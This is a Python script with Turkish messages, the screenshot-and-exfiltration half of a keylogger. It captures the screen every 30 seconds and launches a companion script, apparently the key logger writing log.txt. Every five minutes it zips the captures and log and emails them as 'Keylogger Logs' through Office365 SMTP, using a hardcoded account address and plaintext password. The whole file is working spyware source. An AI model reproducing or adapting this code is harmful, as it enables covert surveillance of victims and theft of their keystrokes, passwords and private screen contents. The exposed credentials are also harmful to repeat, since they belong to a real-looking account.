import pyautogui
import time
import subprocess
import sys
import smtplib
import os
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from zipfile import ZipFile

ssCounter = 0
counter = 1

def takeScreenShot():
    global ssCounter
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'{0}.png'.format(ssCounter+1))
    ssCounter += 1

def zipFile(files):
    print("=> Dosyalar zipleniyor...")
    with ZipFile('files.zip','w') as zip:
        # writing each file one by one
        for file in files:
            zip.write(file)
    print("=> Zipleme tamamlandı!")

def sendMail(files):
    print("=> Mail hazırlanıyor...")
    sender = 'ar_d_mr@hotmail.com'
    receivers = ['ar_d_mr@hotmail.com']
    port = 587
    msg = MIMEMultipart()
    msg['Subject'] = 'Keylogger Logs'
    msg['From'] = 'ar_d_mr@hotmail.com'
    msg['To'] = 'ar_d_mr@hotmail.com'
    for f in files or []:
        with open(f, "rb") as fil:
            part = MIMEApplication(
                fil.read(),
                Name=basename(f)
            )
        # After the file is closed
        part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
        msg.attach(part)
    with smtplib.SMTP('smtp.office365.com', port) as server:
        server.starttls()
        server.login('ar_d_mr@hotmail.com', '010203eray')
        server.sendmail(sender, receivers, msg.as_string())
        print("=> Mail başarıyla gönderildi!")
start = time.time()
takeScreenShot()
p = subprocess.Popen([sys.executable, 'adox.py'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
print("=> Log tutmaya başlandı")
while True:
    end = time.time()
    if (end-start) >= (ssCounter*30):
        takeScreenShot()
    elif (end-start) >= 300*counter:
        files = []
        for i in range(ssCounter):
            files.append("{0}.png".format(i+1))
        files.append("log.txt")
        zipFile(files)
        sendMail(["files.zip"])
        counter += 1